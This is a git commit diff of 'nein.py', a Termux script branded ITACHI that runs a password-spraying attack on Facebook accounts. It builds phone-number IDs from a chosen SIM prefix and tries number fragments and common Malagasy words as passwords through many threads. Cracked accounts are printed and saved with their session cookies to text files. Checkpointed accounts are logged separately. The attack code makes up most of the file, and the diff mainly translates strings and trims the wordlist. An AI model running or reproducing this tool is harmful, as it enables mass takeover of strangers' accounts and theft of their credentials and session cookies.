c2c092dd56ce7ef955399a4533aa7d2a7adde4ab
chrice999 <145717600+chrice999@users.noreply.github.com>
2024-03-18 10:57:30 +0300

    Add files via upload

--- nein.py
+++ nein.py
@@ -1,16 +1,3 @@
-import getpass
-import subprocess
-import os
-from os import system as clr
-import random
-import string 
-from concurrent.futures import ThreadPoolExecutor as tred
-import requests
-import re
-import sys
-import uuid
-import json
-
 # Mot de passe pour déverrouiller le script
 mot_de_passe = "ITACHI2024"
 
@@ -27,7 +14,17 @@ if saisie_mot_de_passe == mot_de_passe:
         print(f"Erreur lors de l'exécution de git pull : {e}")
         exit(1)
     print("Git pull terminé avec succès !")
-
+#------------- import -------------#
+import os
+from os import system as clr
+import random
+import string 
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests
+import re
+import sys
+import uuid
+import json
 #-------------color----------------#
 bblack="\033[1;30m"         # Black
 M="\033[1;31m"            # Red
@@ -37,14 +34,15 @@ bblue="\033[1;34m"          # Blue
 P="\033[1;35m"        # Purple
 C="\033[1;36m"          # Cyan
 B="\033[1;37m"         # White
-my_color = [B,C,P,H]
+my_color = [
+ B,C,P,H]
 warna = random.choice(my_color)
 oks=[]
 cps=[]
 loop=0
-
 #-------------logo-----------------#
 logo=(f'''{B}
+
  _____  ___    _______   __    _____  ___   
 (\"   \|"  \  /"     "| |" \  (\"   \|"  \  
 |.\\   \    |(: ______) ||  | |.\\   \    | 
@@ -53,43 +51,38 @@ logo=(f'''{B}
 |    \    \ | (:      "| /\  |\|    \    \ | 
  \___|\____\) \_______)(__\_|_)\___|\____\) 
                                             
+
 {warna}--------------------------------------------{B}
- Owner    : CHRICE999
+ Owner    : ITACHI
  TOOL NAME : NEIN
  GROUPE-FB   : [TERMUX-COMAND]
- STATUE : FREE
- Facebook : {bblue}ITACHI SQ{bblue}
- Tools    : {warna}[{M}VERSION 1.1{warna}]{warna}
+ Facebook : ITACHI SQ
+ Tools    : {warna}[{H}VERSION 1{warna}]{warna}
 --------------------------------------------{B}''')
-
 #-------------linex def -------------#
 def linex():
     print(f'{warna}--------------------------------------------{B}')
-
 #-------------clear def -------------#
 def clear():
     clr('clear')
     print(logo)
-
 #-------------main def------------#
 def MR_ITACHI():
     clear()
-    os.system('xdg-open https://facebook.com/groups/641144864016773/')
+    os.system('xdg-open https://github.com/MR-DIPTO-404')
     print(f'{B} [{warna}01{B}] RANDOM CLONING ')
     print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
     linex()
-    option=input(f' {B}[{warna}??{B}] CHOISIR MENU >> ')
+    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
     if option in ['01','1']:
         BD_CLONING()
     else:
-        exit(' MERCI BEAUCOUP  :)')
-
+        exit(' Thanks for using dear :)')
 #------------- bd clone def ----------#
 def BD_CLONING():
     user=[]
     clear()
-    print(' CODE SIM MALAGASY : [26132] [26134] [26138] [26133]')
-    print(' 261=0 Madagascar : [032] [034] [038] [033]')
+    print(' EXAMPLE SIM CODE : [26132] [26134] [26138] [26133]')
     code=input(' ENTER SIM CODE >> ')
     linex()
     print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
@@ -105,21 +98,20 @@ def BD_CLONING():
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
-        print(' CLONING EN COURS ... ')
+        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
             Dipto.submit(method_crack,ids,passlist)
     linex()
-    print(' LE CLONING EST FINI ')
+    print(' THE PROGRESS HAS BEEN COMPLETE ')
     print(' TOTAL OK ID '+str(len(oks)))
     print(' TOTAL CP ID '+str(len(cps)))
     input(' PRESS ENTER TO BACK  : ')
     MR_ITACHI()
-
 #------------ method crack def ---------#
-def method_crack(ids, passlist):
+def method_crack(ids,passlist):
     global oks
     global cps
     global loop
@@ -144,19 +136,12 @@ def method_crack(ids, passlist):
                     print('\r\r \033[1;32m[ITACHI-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;32m [COOKIES] '+coki)
-                    # Vérifier si le dossier ITACHI-IDS existe et le créer si nécessaire
-                    if not os.path.exists("ITACHI-IDS"):
-                        os.makedirs("ITACHI-IDS")
-                    # Enregistrer dans le fichier ITACHI-OK.txt
-                    with open(os.path.join("ITACHI-IDS", "ITACHI-OK.txt"), 'a') as f:
-                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
+                    open('/sdcard/ITACHI-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
                 print('\r\r \033[1;30m[ITACHI-CP] '+ids+' | '+pas+'\033[1;37m')
-                # Enregistrer dans le fichier ITACHI-CP.txt
-                with open(os.path.join("ITACHI-IDS", "ITACHI-CP.txt"), 'a') as f:
-                    f.write(ids+'|'+pas+'\n')
+                open('/sdcard/ITACHI-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
@@ -164,6 +149,5 @@ def method_crack(ids, passlist):
         loop+=1
     except:
         pass
-
 #-------------end----------------#
 MR_ITACHI()
